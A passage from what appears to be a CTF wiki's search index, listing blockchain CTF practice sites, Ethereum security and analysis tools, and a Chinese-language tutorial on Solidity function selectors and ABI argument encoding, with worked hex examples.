https://capturetheether.com/challenges/ WP \u94fe\u63a5 WP1 \u4f20\u9001\u95e8 WP2 \u4f20\u9001\u95e8 https://blockchain-ctf.securityinnovation.com/#/ WP \u94fe\u63a5 https://hitcxy.com/2020/securityinnovation/ https://www.damnvulnerabledefi.xyz/ WP \u94fe\u63a5 https://blog.syang.xyz/2021/03/damn-vulnerable-defi-writeup/","title":"\u5728\u7ebf\u505a\u9898\u7f51\u7ad9"},{"location":"blockchain/ethereum/resources/#books","text":"\u300a\u4ee5\u592a\u574a\u6280\u672f\u8be6\u89e3\u4e0e\u5b9e\u6218\u300b-- \u4ee5\u592a\u574a\u521b\u59cb\u4eba\u3001\u9996\u5e2d\u79d1\u5b66\u5bb6 Vitalik Buterin \u503e\u529b\u63a8\u8350 \u5f85\u8865\u5145","title":"Books"},{"location":"blockchain/ethereum/resources/#papers","text":"\u667a\u80fd\u5408\u7ea6 https://github.com/hzysvilla/Academic_Smart_Contract_Papers \u533a\u5757\u94fe\uff08\u5305\u62ec\u667a\u80fd\u5408\u7ea6\uff09 https://github.com/jianyu-niu/blockchain_conference_paper \u5f85\u8865\u5145","title":"papers"},{"location":"blockchain/ethereum/resources/#security-tools","text":"\u642c\u8fd0\u81ea https://consensys.github.io/smart-contract-best-practices/security_tools/","title":"Security Tools"},{"location":"blockchain/ethereum/resources/#visualization","text":"Solidity Visual Auditor - This extension contributes security centric syntax and semantic highlighting, a detailed class outline and advanced Solidity code insights to Visual Studio Code S\u016brya - Utility tool for smart contract systems, offering a number of visual outputs and information about the contracts' structure. Also supports querying the function call graph. Solgraph - Generates a DOT graph that visualizes function control flow of a Solidity contract and highlights potential security vulnerabilities. EVM Lab - Rich tool package to interact with the EVM. Includes a VM, Etherchain API, and a trace-viewer. ethereum-graph-debugger - A graphical EVM debugger. Displays the entire program control flow graph. Piet - Web application helping understand smart contract architectures. Offers graphical representation and inspection of smart contracts as well as a markdown documentation generator.","title":"Visualization"},{"location":"blockchain/ethereum/resources/#static-and-dynamic-analysis","text":"MythX - MythX is a professional-grade cloud service that uses symbolic analysis and input fuzzing to detect common security bugs and verify the correctness of smart contract code . Using MythX requires an API key from mythx.io . Mythril - The Swiss army knife for smart contract security. Slither - Static analysis framework with detectors for many common Solidity issues. It has taint and value tracking capabilities and is written in Python. Contract-Library - Decompiler and security analysis tool for all deployed contracts. Echidna - The only available fuzzer for Ethereum software. Uses property testing to generate malicious inputs that break smart contracts. Manticore - Dynamic binary analysis tool with EVM support . Oyente - Analyze Ethereum code to find common vulnerabilities, based on this paper . Securify - Fully automated online static analyzer for smart contracts, providing a security report based on vulnerability patterns. SmartCheck - Static analysis of Solidity source code for security vulnerabilities and best practices. Octopus - Security Analysis tool for Blockchain Smart Contracts with support of EVM and (e)WASM. sFuzz - Efficient fuzzer inspired from AFL to find common vulnerabilities. Vertigo - Mutation Testing for Ethereum Smart Contracts.","title":"Static and Dynamic Analysis"},{"location":"blockchain/ethereum/resources/#weakness-ossclassifcation-test-cases","text":"SWC-registry - SWC definitions and a large repository of crafted and real-world samples of vulnerable smart contracts. SWC Pages - The SWC-registry repo published on Github Pages","title":"Weakness OSSClassifcation &amp; Test Cases"},{"location":"blockchain/ethereum/resources/#test-coverage","text":"solidity-coverage - Code coverage for Solidity testing.","title":"Test Coverage"},{"location":"blockchain/ethereum/resources/#linters-and-formatters","text":"Linters improve code quality by enforcing rules for style and composition, making code easier to read and review. Ethlint - Yet another Solidity linting. Solhint - A linter for Solidity that provides both Security and Style Guide validations. Prettier + Solidity Plugin - Prettier enforces basic style conventions in your code.","title":"Linters and Formatters"},{"location":"blockchain/ethereum/reverse/","text":"Smart Contract Reverse \u00b6 Note \u667a\u80fd\u5408\u7ea6\u5927\u591a\u6570\u4ee3\u7801\u4e0d\u516c\u5f00\u6e90\u7801\uff0c\u516c\u5f00\u5b57\u8282\u7801\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u9006\u5411\u5de5\u5177\u6216\u8005\u4eba\u5de5\u8fdb\u884c\u9006\u5411\u5206\u6790\u3002 Related Tools \u00b6 https://ethervm.io/decompile \u6709\u65f6\u5019\u83ab\u540d\u5176\u5999\u5d29\u6e83 https://www.trustlook.com/services/smart.html \u5176\u4ed6 \u5177\u4f53\u5185\u5bb9\u5f85\u8865\u5145","title":"Smart Contract Reverse"},{"location":"blockchain/ethereum/reverse/#smart-contract-reverse","text":"Note \u667a\u80fd\u5408\u7ea6\u5927\u591a\u6570\u4ee3\u7801\u4e0d\u516c\u5f00\u6e90\u7801\uff0c\u516c\u5f00\u5b57\u8282\u7801\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u9006\u5411\u5de5\u5177\u6216\u8005\u4eba\u5de5\u8fdb\u884c\u9006\u5411\u5206\u6790\u3002","title":"Smart Contract Reverse"},{"location":"blockchain/ethereum/reverse/#related-tools","text":"https://ethervm.io/decompile \u6709\u65f6\u5019\u83ab\u540d\u5176\u5999\u5d29\u6e83 https://www.trustlook.com/services/smart.html \u5176\u4ed6 \u5177\u4f53\u5185\u5bb9\u5f85\u8865\u5145","title":"Related Tools"},{"location":"blockchain/ethereum/selector-encoding/","text":"Function Selector and Argument Encoding \u00b6 \u8be6\u7ec6\u53ef\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u53c2\u8003\u81ea\u5df1\u535a\u5ba2 Function Selector and Argument Encoding \u5728 Ethereum \u751f\u6001\u7cfb\u7edf\u4e2d\uff0cABI (Application Binary Interface\uff0c\u5e94\u7528\u4e8c\u8fdb\u5236\u63a5\u53e3) \u662f\u4ece\u533a\u5757\u94fe\u5916\u90e8\u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\u4ee5\u53ca\u5408\u7ea6\u4e0e\u5408\u7ea6\u95f4\u8fdb\u884c\u4ea4\u4e92\u7684\u4e00\u79cd\u6807\u51c6\u65b9\u5f0f\u3002\u6570\u636e\u4f1a\u6839\u636e\u5176\u7c7b\u578b\u6309\u7167\u8fd9\u4efd\u624b\u518c\u4e2d\u8bf4\u660e\u7684\u65b9\u6cd5\u8fdb\u884c\u7f16\u7801\u3002 Function Selector \u00b6 \u539f\u7406 \u00b6 \u67d0\u4e2a\u51fd\u6570\u7b7e\u540d\u7684 Keccak (SHA-3) \u54c8\u5e0c\u7684\u524d 4 \u5b57\u8282\uff0c\u6307\u5b9a\u4e86\u8981\u8c03\u7528\u7684\u51fd\u6570\uff0c\u5f62\u5982 bytes4(keccak256('balanceOf(address)')) == 0x70a08231 \u8fd9\u79cd\u5f62\u5f0f\uff0c0x70a08231 \u4fbf\u662f balanceOf(address) \u7684 Function Selector \u57fa\u7840\u539f\u578b\u5373\u662f\u51fd\u6570\u540d\u79f0\u52a0\u4e0a\u7531\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u53c2\u6570\u7c7b\u578b\u5217\u8868\uff0c\u53c2\u6570\u7c7b\u578b\u95f4\u7531\u4e00\u4e2a\u9017\u53f7\u5206\u9694\u5f00\uff0c\u4e14\u6ca1\u6709\u7a7a\u683c \u5bf9\u4e8e uint \u7c7b\u578b\uff0c\u8981\u8f6c\u6210 uint256 \u8fdb\u884c\u8ba1\u7b97\uff0c\u6bd4\u5982 ownerOf(uint256) \u5176 Function Selector = bytes4(keccak256('ownerOf(uint256)')) == 0x6352211e \u51fd\u6570\u53c2\u6570\u5305\u542b\u7ed3\u6784\u4f53\uff0c\u76f8\u5f53\u4e8e\u628a\u7ed3\u6784\u4f53\u62c6\u5206\u6210\u5355\u4e2a\u53c2\u6570\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e9b\u53c2\u6570\u7528 () \u6269\u8d77\u6765\uff0c\u8be6\u7ec6\u53ef\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 \u4f8b\u5b50 \u00b6 pragma solidity >= 0.4.16 < 0.9.0 ; pragma experimental ABIEncoderV2 ; contract Demo { struct Test { string name ; string policies ; uint num ; } uint public x ; function test1 ( bytes3 ) public { x = 1 ;} function test2 ( bytes3 [ 2 ] memory ) public { x = 1 ; } function test3 ( uint32 x , bool y ) public { x = 1 ; } function test4 ( uint , uint32 [] memory , bytes10 , bytes memory ) public { x = 1 ; } function test5 ( uint , Test memory test ) public { x = 1 ; } function test6 ( uint , Test [] memory tests ) public { x = 1 ; } function test7 ( uint [][] memory , string [] memory ) public { x = 1 ; } } /* \u51fd\u6570\u9009\u62e9\u5668 { \"0d2032f1\": \"test1(bytes3)\", \"2b231dad\": \"test2(bytes3[2])\", \"92e92919\": \"test3(uint32,bool)\", \"4d189ce2\": \"test4(uint256,uint32[],bytes10,bytes)\", \"4ca373dc\": \"test5(uint256,(string,string,uint256))\", \"ccc5bdd2\": \"test6(uint256,(string,string,uint256)[])\", \"cc80bc65\": \"test7(uint256[][],string[])\", \"0c55699c\": \"x()\" } */ Function Selector and Argument Encoding \u00b6 \u539f\u7406 \u00b6 \u52a8\u6001\u7c7b\u578b\u7684\u6570\u636e\uff0c\u6bd4\u5982\u52a8\u6001\u6570\u7ec4\uff0c\u7ed3\u6784\u4f53\uff0c\u53d8\u957f\u5b57\u8282\uff0c\u5176\u7f16\u7801\u540e\u5b58\u50a8\u5176 offset \u3001 length \u3001 data \u5148\u628a\u53c2\u6570\u987a\u5e8f\u5b58\u50a8\uff1a\u5982\u679c\u662f\u5b9a\u957f\u6570\u636e\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data \uff0c\u5982\u679c\u662f\u53d8\u957f\u6570\u636e\u7c7b\u578b\uff0c\u5148\u5b58\u50a8\u5176 offset \u987a\u5e8f\u904d\u5386\u53d8\u957f\u6570\u636e\uff1a\u5148\u5b58\u50a8 offset \uff0c\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5148\u5b58\u50a8\u5176 offset = 0x20 * number ( number \u662f\u51fd\u6570\u53c2\u6570\u7684\u4e2a\u6570 )\uff1b\u5bf9\u4e8e\u4e0b\u4e00\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5176 offset = offset_of_prev + 0x20 + 0x20 * number (\u7b2c\u4e00\u4e2a 0x20 \u662f\u5b58\u50a8\u524d\u4e00\u4e2a\u53d8\u957f\u6570\u636e\u7684\u957f\u5ea6\u5360\u7528\u7684\u5927\u5c0f\uff0c number \u662f\u524d\u4e00\u4e2a\u53d8\u957f\u6570\u636e\u7684\u5143\u7d20\u4e2a\u6570) \u987a\u5e8f\u904d\u5386\u53d8\u957f\u6570\u636e\uff1a\u5b58\u50a8\u5b8c offset \uff0c\u63a5\u7740\u5c31\u662f\u904d\u5386\u6bcf\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5206\u522b\u5b58\u50a8\u5176 length \u548c data ( ps: \u5bf9\u4e8e\u7ed3\u6784\u4f53\u8fd9\u6837\u7684\u7c7b\u578b\uff0c\u5b58\u50a8\u7684\u65f6\u5019\u53ef\u628a\u7ed3\u6784\u4f53\u5185\u5143\u7d20\u770b\u6210\u662f\u4e00\u4e2a\u65b0\u51fd\u6570\u7684\u53c2\u6570\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u5bf9\u4e8e\u7ed3\u6784\u4f53\u4e2d\u7684\u7b2c\u4e00\u4e2a\u53d8\u957f\u6570\u636e\uff0c\u5176 offset = 0x20 * num \uff0c num \u662f\u7ed3\u6784\u4f53\u5143\u7d20\u7684\u4e2a\u6570 ) \u4f8b\u5b50 \u00b6 \u9488\u5bf9\u4e0a\u8ff0\u7684\u5408\u7ea6\u4f8b\u5b50\u7684 7 \u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u8c03\u7528\u6700\u7ec8\u7f16\u7801\u5982\u4e0b test1(\"0x112233\") 0x0d2032f1 // function selector 0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // data of first parameter test2([\"0x112233\",\"0x445566\"]) 0x2b231dad // function selector 0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // first data of first parameter 1 - 0x4455660000000000000000000000000000000000000000000000000000000000 // second data of first parameter test3(0x123,1) 0x92e92919 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter 1 - 0x0000000000000000000000000000000000000000000000000000000000000001 // data of second parameter test4(0x123,[\"0x11221122\",\"0x33443344\"],\"0x31323334353637383930\",\"0x3132333435\") 0x4d189ce2 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter 1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter 2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter 3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter 4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter 5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter 6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter 7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter 8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter /* \u4e00\u4e9b\u89e3\u91ca\u8bf4\u660e data of first parameter: uint \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data offset of second parameter: uint32[] \u52a8\u6001\u6570\u7ec4\uff0c\u5148\u5b58\u50a8\u5176 offset=0x20*4 ( 4 \u4ee3\u8868\u51fd\u6570\u53c2\u6570\u7684\u4e2a\u6570 ) data of third parameter: bytes10 \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data offset of forth parameter: bytes \u53d8\u957f\u7c7b\u578b\uff0c\u5148\u5b58\u50a8\u5176 offset=0x80+0x20*3=0xe0 (0x80 \u662f\u524d\u4e00\u4e2a\u53d8\u957f\u7c7b\u578b\u7684 offset\uff0c3 \u662f\u524d\u4e00\u4e2a\u53d8\u957f\u7c7b\u578b\u5b58\u50a8\u5176\u957f\u5ea6\u548c\u4e24\u4e2a\u5143\u7d20\u5360\u7528\u7684\u63d2\u69fd\u4e2a\u6570) length of second parameter: \u5b58\u50a8\u5b8c data \u6216\u8005 offset \u540e\uff0c\u4fbf\u5f00\u59cb\u5b58\u50a8\u53d8\u957f\u6570\u636e\u7684 length \u548c data\uff0c\u8fd9\u91cc\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u957f\u5ea6 first data of second parameter: \u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u7b2c\u4e00\u4e2a\u6570\u636e second data of second parameter: \u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u7b2c\u4e8c\u4e2a\u6570\u636e length of forth parameter: \u4e0a\u9762\u5c31\u628a\u7b2c\u4e8c\u4e2a\u53d8\u957f\u6570\u636e\u5b58\u50a8\u5b8c\u6210\uff0c\u8fd9\u91cc\u5c31\u662f\u5b58\u50a8\u4e0b\u4e00\u4e2a\u53d8\u957f\u6570\u636e\u7684\u957f\u5ea6 data of forth parameter: \u7b2c\u56db\u4e2a\u53c2\u6570\u7684\u6570\u636e */ test5(0x123,[\"cxy\",\"pika\",123]) 0x4ca373dc // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter 1 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter 2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // first data offset of second parameter 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // second data offset of second parameter 4 - 0x000000000000000000000000000000000000000000000000000000000000007b // third data of second parameter 5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // first data length of second parameter 6 - 0x6378790000000000000000000000000000000000000000000000000000000000 // first data of second parameter 7 - 0x0000000000000000000000000000000000000000000000000000000000000004 // second data length of second parameter 8 - 0x70696b6100000000000000000000000000000000000000000000000000000000 // second data of second parameter /* \u4e00\u4e9b\u89e3\u91ca\u8bf4\u660e data of first parameter: uint \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data offset of second parameter: \u7ed3\u6784\u4f53\uff0c\u5148\u5b58\u50a8\u5176 offset=0x20*2 ( 2 \u4ee3\u8868\u51fd\u6570\u53c2\u6570\u7684\u4e2a\u6570) first data offset of second parameter: \u7ed3\u6784\u4f53\u5185\u5143\u7d20\u53ef\u5f53\u6210\u51fd\u6570\u53c2\u6570\u62c6\u5206\uff0c\u6709\u4e09\u4e2a\u5143\u7d20\uff0c\u56e0\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f string \u7c7b\u578b\uff0c\u6240\u4ee5\u5148\u5b58\u50a8\u5176 offset=0x20*3=0x60 second data offset of second parameter: \u7ed3\u6784\u4f53\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f string \u7c7b\u578b\uff0c\u5148\u5b58\u50a8\u5176 offset=0x60+0x20+0x20=0xa0 (\u7b2c\u4e00\u4e2a 0x20 \u662f\u5b58\u50a8\u7b2c\u4e00\u4e2a string \u7684\u957f\u5ea6\u6240\u5360\u5927\u5c0f\uff0c\u7b2c\u4e8c\u4e2a 0x20 \u662f\u5b58\u50a8\u7b2c\u4e00\u4e2a string \u7684\u6570\u636e\u6240\u5360\u5927\u5c0f) third data of second parameter: \u7ed3\u6784\u4f53\u7b2c\u4e09\u4e2a\u5143\u7d20\u662f uint \u5b9a\u957f\u7c7b\u578b\uff0c\u76f4\u63a5\u5b58\u50a8\u5176 data first data length of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684 length first data of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684 data second data length of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e8c\u4e2a\u5143\u7d20\u7684 length second data of second parameter: \u5b58\u50a8\u7ed3\u6784\u4f53\u7b2c\u4e8c\u4e2a\u5143\u7d20\u7684 data */ test6(0x123,[[\"cxy1\",\"pika1\",123], [\"cxy2\",\"pika2\",456]]) \u7531\u4e8e\u662f\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u6240\u4ee5\u9700\u8981\u62c6\u5206\uff0c\u7531\u5185\u5411\u5916\u3002\u5185\u90e8\u662f\u4e24\u4e2a\u7ed3\u6784\u4f53\uff0c\u5206\u522b\u6765\u770b\u5176 encoding \u5bf9\u4e8e [\"cxy1\",\"pika1\",123] \u7ed3\u6784\u4f53\uff0c\u5176 encoding \u5982\u4e0b\uff08 \u76f4\u63a5\u5f53\u6210\u51fd\u6570\u53c2\u6570 encoding \uff09 0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 2 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 3 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 4 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 6 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" \u5bf9\u4e8e [\"cxy2\",\"pika2\",456] \u7ed3\u6784\u4f53\uff0c\u5176 encoding \u5982\u4e0b\uff08\u76f4\u63a5\u5f53\u6210\u51fd\u6570\u53c2\u6570 encoding \uff09 0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 2 - 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 3 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 4 - 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 6 - 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" \u7531\u4e8e\u662f\u7ed3\u6784\u4f53\uff0c\u6240\u4ee5\u8fd8\u9700\u8981 [\"cxy1\",\"pika1\",123] \u7684 offset \u548c [\"cxy2\",\"pika2\",456] \u7684 offset\uff0c\u5982\u4e0b 0 - a // offset of [\"cxy1\",\"pika1\",123] 1 - b // offset of [\"cxy2\",\"pika2\",456] 2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 4 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 5 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 6 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 8 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" 9 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 10- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 11- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 12- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 13- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 14- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 15- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" a\u6307\u5411 offset of \"cxy1\"\uff0c\u6240\u4ee5 a=0x20*2=0x40 b\u6307\u5411 offset of \"cxy2\"\uff0c\u6240\u4ee5 b=0x20*9=0x120 \u7531\u4e8e\u662f\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u7ed3\u6784\u4f53\u5916\u9762\u662f\u6570\u7ec4\uff0c\u6240\u4ee5\u8981\u6309\u7167\u52a8\u6001\u6570\u7ec4encoding\u7684\u65b9\u6cd5\uff0c\u5982\u4e0b 0 - c // offset of [[\"cxy1\",\"pika1\",123],[\"cxy2\",\"pika2\",456]] 1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter 2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [\"cxy1\",\"pika1\",\"1\"] 3 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [\"cxy2\",\"pika2\",\"1\"] 4 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 5 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 6 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 7 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 8 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 10- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" 11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 13- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 14- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 15- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 16- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 17- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" c \u662f\u51fd\u6570\u53c2\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u662f\u52a8\u6001\u7c7b\u578b\uff0c\u6240\u4ee5 offset c = 0x20*2 = 0x40 \u6240\u4ee5\u603b\u7684 encoding \u5982\u4e0b 0xccc5bdd2 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // encoding of 0x123 1 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter 3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [\"cxy1\",\"pika1\",\"1\"] 4 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [\"cxy2\",\"pika2\",\"1\"] 5 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy1\" 6 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika1\" 7 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 123 8 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy1\" 9 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of \"cxy1\" 10- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika1\" 11- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of \"pika1\" 12- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of \"cxy2\" 13- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of \"pika2\" 14- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 456 15- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of \"cxy2\" 16- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of \"cxy2\" 17- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of \"pika2\" 18- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of \"pika2\" test7([[1,2],[3]],[\"one\",\"two\",\"three\"]) \u540c\u7406\u8fdb\u884c\u7531\u5185\u5411\u5916\u7684\u62c6\u5206\uff0c\u9996\u5148\u662f [[1,2],[3]] \u52a8\u6001\u6570\u7ec4\u4e2d\u7684 [1, 2] \u548c [3] \u4e24\u4e2a\u52a8\u6001\u6570\u7ec4 0 - a // offset of [1,2] 1 - b // offset of [3] 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 3 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 6 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3 a \u6307\u5411 [1,2] \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 a=0x20*2=0x40 b \u6307\u5411 [3] \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 b=0x20*5=0xa0 \u7136\u540e\u662f [[1,2],[3]] \u52a8\u6001\u6570\u7ec4\u672c\u8eab\u7684 encoding 0 - c // offset of [[1,2],[3]] 1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]] 2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2] 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3] 4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 6 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 7 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 8 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3 c \u6307\u5411 [[1,2],[3]] \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 a=0x20*2=0x40 \u5176\u6b21\u662f [\"one\",\"two\",\"three\"] \u52a8\u6001\u6570\u7ec4\u4e2d\u6bcf\u4e2a string \u7684 encoding 0 - d // offset for \"one\" 1 - e // offset for \"two\" 2 - f // offset for \"three\" 3 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 4 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 6 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 8 - 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\" d \u6307\u5411 \u201cone\u201d \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 d=0x20*3=0x60 e \u6307\u5411 \u201ctwo\u201d \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 e=0x20*5=0xa0 f \u6307\u5411 \u201cthree\u201d \u7684\u5f00\u59cb\uff0c\u6240\u4ee5 f=0x20*7=0xe0 \u7136\u540e\u662f [\"one\",\"two\",\"three\"] \u52a8\u6001\u6570\u7ec4\u672c\u8eab\u7684 encoding 0 - g // offset of [\"one\",\"two\",\"three\"] 1 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"] 2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\" 3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\" 4 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\" 5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 6 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 7 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 8 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 10- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\" \u8fd9\u91cc g \u5148\u4e0d\u8fdb\u884c\u8ba1\u7b97\uff0c\u56e0\u4e3a\u6d89\u53ca\u5230\u51fd\u6570\u53c2\u6570\u6574\u4f53\u7684\u4e00\u4e2a encoding \u4e0a\u9762\u5c31\u5df2\u7ecf\u628a\u6700\u540e\u5c31\u662f [[1,2],[3]] \u548c [\"one\",\"two\",\"three\"] 